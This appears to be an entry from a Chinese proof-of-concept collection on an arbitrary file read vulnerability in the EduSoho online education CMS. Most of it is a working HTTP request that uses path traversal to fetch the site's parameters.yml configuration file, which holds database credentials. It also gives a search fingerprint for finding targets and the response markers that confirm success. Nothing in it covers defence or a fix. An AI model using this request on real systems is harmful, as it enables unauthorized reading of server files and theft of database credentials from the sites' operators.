﻿# Edusoho网络课堂cms存在任意文件读取漏洞

> 更新时间：2024-02-26

> 漏洞编号：

> 漏洞说明：Edusoho网络课堂是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。Edusoho网络课堂存在任意文件读取漏洞

> 漏洞特征：title="EduSoho"

> 验证脚本：HTTP

```
GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: Keep-Alive
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77
Upgrade-Insecure-Requests: 127
```

> 响应代码特征：200

> 响应内容特征：database_name

> 上传文件定位：

> 验证文件来源：Edusoho网络课堂cms存在任意文件读取漏洞.poc